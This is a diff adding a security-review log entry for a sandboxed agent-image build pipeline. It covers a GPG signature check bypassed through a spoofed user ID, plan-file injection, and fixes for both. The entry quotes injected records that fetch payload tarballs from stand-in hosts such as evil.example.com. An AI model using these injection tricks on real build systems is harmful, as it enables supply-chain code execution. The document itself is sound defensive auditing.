@@ -570,6 +570,81 @@
     built IMAGE -- which is what Contract 5 already says Phase A does. The tempting wrong reading,
     written down because it was TRUE before this deviation and is FALSE after it: "the context no
     longer contains control-plane paths, so the agent images cannot have them."
+    CODEX ADVERSARIAL PASS ON SF-5, 2026-09-09, at operator request after the two SF-5 commits,
+    following SF-2's, SF-3's and SF-4's precedent. FIVE findings, ALL FIVE REPRODUCED HERE before
+    being accepted and ALL FIVE FIXED. None declined -- matching SF-3's pass (7/7) and SF-4's
+    (5/5) rather than SF-2's (6 of 11).
+    HIGH 1, AND IT DEFEATS THE TRUST ANCHOR THIS SUB-FEATURE IS BUILT ON. The fingerprint
+    assertion was `case "$status" in *"VALIDSIG "*" ${FPR}"*)` -- a SUBSTRING match over gpgv's
+    whole status output. GOODSIG carries the key's USER ID as free text, so a substituted keyring
+    whose UID contains the literal string "VALIDSIG filler <pinned-fingerprint>" satisfied the glob
+    while the actual VALIDSIG line named a completely different key. Reproduced: ACCEPTED, with the
+    real signature by key AAAA... against a pin of B8B8... The same glob also ignored EXPKEYSIG and
+    REVKEYSIG, which ACCOMPANY a VALIDSIG rather than replacing it. Now parsed BY FIELD -- VALIDSIG
+    field 12 is the PRIMARY key fingerprint, which is what the profile pins; field 3 is the signing
+    subkey and does NOT satisfy it, confirmed by control.
+    THE FIX'S OWN FIRST DRAFT WAS WRONG IN THE MIRROR DIRECTION, and the build caught it -- worth
+    recording because it is the same class of error pointing the other way. It gated on gpgv's EXIT
+    STATUS and rejected on ERRSIG/NO_PUBKEY. MEASURED: this InRelease carries THREE signatures --
+    the bookworm key we pin plus two Debian keys deliberately NOT in our single-key keyring -- so
+    gpgv exits 2 with ERRSIG/NO_PUBKEY for those two even when our key gives a clean GOODSIG plus
+    VALIDSIG. apt behaves the same way: a multi-signed index is trusted when ANY held key validates
+    it. So the exit status is deliberately NOT the gate, and only BADSIG/EXPKEYSIG/REVKEYSIG -- the
+    statuses that impugn OUR key, the keyring holding exactly one -- are fatal. Both directions
+    controlled against the REAL index: wrong pinned fingerprint exits 2, correct one exits 0.
+    HIGH 2 IS SF-3's LESSON REPEATING A SECOND TIME IN THIS FEATURE, and it is worse than the
+    report claimed. The plan files are whitespace-delimited and pack-install.sh re-splits them with
+    `read -r name version sha`, but no scalar was checked for whitespace. A single YAML BLOCK
+    SCALAR in one `version` or `url` emitted a SECOND well-formed record the writer never intended.
+    REPRODUCED with a throwaway pack declaring ONE apt item and ONE archive: the plan came out with
+    TWO of each, including `go 1.23.4 https://evil.example.com/go.tar.gz`. A second probe proved
+    the injected record ALSO BYPASSES require_https AND the archive-name allowlist -- it emitted
+    `totally-unknown-archive 0.0.1 http://plaintext.evil.example.com/payload.tar.gz` past both,
+    because those checks ran against the ORIGINAL field and never against the split records. With
+    the name `node` or `go` and a matching checksum -- both attacker-controlled, since the attacker
+    wrote the manifest -- that is a tarball unpacked over /usr/local, i.e. arbitrary code in every
+    agent image, from a manifest that READS as declaring one entry. Generalises exactly as SF-3
+    recorded it: introducing an internal encoding retroactively makes every value flowing into it
+    security-relevant. Fixed with require_token on every field that becomes part of a record.
+    MEDIUM 3 HAD TWO HALVES; ONE FIXED, ONE RECORDED AS A RESIDUAL. The fixed half: pack-plan.sh
+    demanded package_repository.apt UNCONDITIONALLY, so a zero-pack profile died at
+    "package_repository.apt must be !!map, found !!null" -- contradicting profiles/default.yaml's
+    own stated contract, "Required only when `packs` above is non-empty". test-selfcheck and
+    test-fixtures are correct as written and deliberately omit the block; they now resolve to an
+    empty plan and exit 0. The RESIDUAL half: MEDIATOR_PROFILE (runtime) and the agent build's
+    PROFILE arg can diverge -- `MEDIATOR_TEST_PROFILE=test-selfcheck` gives the mediator that
+    profile while all three agents build `default`. Inert today because the two shipped profiles
+    have identical pack sets and the test profiles are zero-pack, and the harness in question tests
+    egress rather than packages. NOT fixed here by decision: unifying them is the per-profile build
+    that Files-to-Modify assigns to SF-6's scripts/build.sh, and inventing a second mechanism at
+    SF-5 would be the thing SF-6 then has to undo. Recorded so it is a scheduled decision and not
+    a discovery.
+    MEDIUM 4: THE VERIFIER'S OWN FAILURE MODE. remove-package-managers.sh claims "no package
+    manager reachable" but proved it with an ALLOWLIST OF NAMES. Reproduced: `pnpm` and `pipx`
+    planted in a container, script exits 0 claiming success, both still run. Two changes -- the
+    inventory widened to 21 binaries, and the Python check moved from `python3 -m pip --version`
+    failing to importlib find_spec, because a pip that is PRESENT BUT BROKEN also fails the old
+    check and would have passed it vacuously. Re-probed with four installers planted OUTSIDE the
+    removal list: all four named, exit 3; clean image still exit 0.
+    LOW 5: `.packs[]` entries were not individually tag-checked, and yq renders the YAML scalars
+    `true`, `null` and `0755` as text that satisfies the pack-name regex -- so a boolean would have
+    been used to build a directory path. scripts/compile-policy.sh already refuses YAML-ambiguous
+    pack names at the producer; the second reader has now caught up. Probed: `packs: [true]` exits
+    2 naming !!bool.
+    ONE PROBE DEFECT, NOT A CODE DEFECT, fixed rather than accepted -- the same bookkeeping SF-3's
+    pass recorded. The first injection probe left both packs selected, so the duplicate-package
+    gate fired correctly and masked the finding; re-run with only the probe pack selected.
+    FOUR CODEX CLAIMS WERE CHECKED AND HELD, recorded so the pass's negative results are not lost:
+    the declared-package checksum ORDER is correct (fresh per-package directory, hash, then install
+    from the local file); `find -print -quit` cannot pick a stale .deb because that directory is
+    rm -rf'd each iteration; the .dockerignore trailing denies do win over `!images`; and the
+    build-cache fragment renders three distinct named volumes.
+    EVERYTHING RE-RUN AFTER THE FIXES. All three images rebuilt and re-inspected: no manager
+    reachable, node v22.23.2 / Python 3.11.2 / go1.23.4 / git 2.39.5 present, dpkg database
+    retained (146/146/149). Positive control that the default profile still resolves to the same
+    2 apt items and 2 archives. lint-policy.sh exits 0 and all THREE committed artifacts are
+    --check current. BOTH HARNESSES RE-RUN AGAINST THE REBUILT IMAGES: verify-pod-topology.sh ALL
+    CHECKS PASSED and verify-egress-mediator.sh 77/77, 0 failures, phases A-G, ALL PHASES PASSED.
     Codebase assessment still ABSENT; refresh skipped with a warning, as at SF-1..SF-4.
     Notes: Re-planned 2026-09-07 against 01.3 as built; plan approved 2026-09-07 and **Gate 4
     CLOSED the same day** -- all three open items resolved by operator decision (supersedes the
